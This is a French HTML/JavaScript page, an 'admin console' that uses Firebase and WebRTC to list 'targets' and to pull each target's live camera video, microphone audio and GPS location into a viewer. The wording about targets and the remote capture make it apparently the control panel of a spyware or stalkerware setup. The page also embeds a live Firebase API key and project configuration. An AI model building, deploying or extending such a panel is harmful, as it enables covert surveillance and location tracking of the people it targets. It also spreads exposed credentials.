<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Console Admin WebRTC</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .log-box { font-family: 'Courier New', monospace; font-size: 12px; height: 150px; overflow-y: auto; background: #000; color: #00ff00; padding: 10px; border-radius: 8px; }
    </style>
</head>
<body class="bg-slate-950 text-slate-100 min-h-screen p-6">

    <div class="max-w-6xl mx-auto grid grid-cols-1 lg:grid-cols-3 gap-6">
        
        <!-- Colonne Gauche -->
        <div class="space-y-6">
            <div class="bg-slate-900 p-6 rounded-2xl border border-slate-800 shadow-xl">
                <h2 class="text-lg font-bold mb-4">👤 Cibles Détectées</h2>
                <select id="userSelect" class="w-full bg-slate-950 border border-slate-800 rounded-lg p-3 text-sm mb-4">
                    <option value="">-- Choisir une cible --</option>
                </select>
                <div class="grid grid-cols-2 gap-2">
                    <button id="connectBtn" class="bg-indigo-600 hover:bg-indigo-500 py-2 rounded-lg font-bold text-xs">🔗 Se connecter</button>
                    <button id="stopBtn" class="bg-red-900 hover:bg-red-800 py-2 rounded-lg font-bold text-xs">⏹️ Arrêter</button>
                </div>
                <button id="audioBtn" class="w-full mt-2 bg-emerald-700 hover:bg-emerald-600 py-2 rounded-lg font-bold text-xs">🔊 Activer l'Audio</button>
            </div>

            <div id="gpsBox" class="bg-slate-900 p-6 rounded-2xl border border-slate-800">
                <h3 class="text-sm font-semibold text-slate-400 mb-2">📍 Coordonnées GPS</h3>
                <div id="gpsData" class="text-xs font-mono text-slate-300">Aucune donnée</div>
            </div>

            <div class="bg-slate-900 p-6 rounded-2xl border border-slate-800">
                <h3 class="text-sm font-semibold text-slate-400 mb-2">💾 Logs de Connexion WebRTC</h3>
                <div id="logsConsole" class="log-box"></div>
            </div>
        </div>

        <!-- Colonne Droite (Vidéo) -->
        <div class="lg:col-span-2 space-y-4">
            <video id="remoteVideo" autoplay playsinline muted class="w-full aspect-video bg-black rounded-2xl border border-slate-700 shadow-2xl"></video>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-app.js";
        import { getDatabase, ref, onValue, set, push } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCiTlZ2IyY-y4vOHi0zrvHsp-Ro95wzFaU",
            authDomain: "universite-taak.firebaseapp.com",
            databaseURL: "https://universite-taak-default-rtdb.firebaseio.com",
            projectId: "universite-taak",
            storageBucket: "universite-taak.firebasestorage.app",
            messagingSenderId: "550634728649",
            appId: "1:550634728649:web:12147e8dec3a04618c3118",
            measurementId: "G-RD7KY6BFP4"
        };

        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);
        
        let pc = null;
        const userSelect = document.getElementById('userSelect');
        const logsConsole = document.getElementById('logsConsole');
        const remoteVideo = document.getElementById('remoteVideo');
        const audioBtn = document.getElementById('audioBtn');

        function addLog(msg) {
            const time = new Date().toLocaleTimeString();
            logsConsole.innerHTML += `[${time}] ${msg}<br>`;
            logsConsole.scrollTop = logsConsole.scrollHeight;
        }

        // 1. Détection Cibles
        function loadUsers() {
            onValue(ref(database, 'webrtc'), (snapshot) => {
                const data = snapshot.val();
                userSelect.innerHTML = '<option value="">-- Choisir une cible --</option>';
                if(data) {
                    Object.keys(data).forEach(id => {
                        const opt = document.createElement('option');
                        opt.value = id;
                        opt.textContent = `🟢 [LIVE] Cible #${id}`;
                        userSelect.appendChild(opt);
                    });
                }
            });
        }

        // 2. Connexion
        document.getElementById('connectBtn').addEventListener('click', async () => {
            const userId = userSelect.value;
            if(!userId) return addLog("⚠️ Sélectionnez une cible !");

            addLog(`🔍 Demande de flux pour #${userId}...`);
            pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });

            pc.ontrack = (event) => {
                remoteVideo.srcObject = event.streams[0];
                addLog("🎬 Flux vidéo & audio reçu !");
            };

            pc.onicecandidate = (e) => {
                if(e.candidate) push(ref(database, `webrtc/${userId}/admin-candidates`), e.candidate.toJSON());
            };

            // Écoute de l'offre
            onValue(ref(database, `webrtc/${userId}/offer`), async (snapshot) => {
                const offer = snapshot.val();
                if(offer && !pc.currentRemoteDescription) {
                    await pc.setRemoteDescription(new RTCSessionDescription(offer));
                    const answer = await pc.createAnswer();
                    await pc.setLocalDescription(answer);
                    await set(ref(database, `webrtc/${userId}/answer`), answer);
                    addLog("📤 Réponse admin transmise.");
                }
            });

            // GPS Listener
            onValue(ref(database, `users/${userId}/location`), (snapshot) => {
                const loc = snapshot.val();
                if(loc) document.getElementById('gpsData').innerText = `Lat: ${loc.lat}\nLng: ${loc.lng}`;
            });
        });

        // 3. Audio
        audioBtn.addEventListener('click', () => {
            remoteVideo.muted = false;
            remoteVideo.play();
            addLog("🔊 Audio activé.");
        });

        document.getElementById('stopBtn').addEventListener('click', () => {
            if(pc) pc.close();
            addLog("⏹️ Connexion fermée.");
        });

        loadUsers();
    </script>
</body>
</html>
